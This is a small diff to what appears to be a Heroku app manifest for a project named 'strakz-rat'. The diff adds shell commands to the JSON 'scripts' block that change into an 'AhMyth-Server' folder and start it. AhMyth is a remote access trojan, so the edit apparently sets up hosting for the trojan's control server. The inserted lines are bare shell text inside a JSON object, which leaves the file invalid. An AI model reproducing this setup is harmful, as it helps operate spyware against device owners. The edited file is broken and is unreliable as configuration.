@@ -13,7 +13,11 @@
   "formation": {
   },
   "name": "strakz-rat",
-  "scripts": {
+  "scripts": { 
+    
+    ls
+    cd AhMyth-Server/
+    npm start
   },
   "stack": "heroku-18"
 }
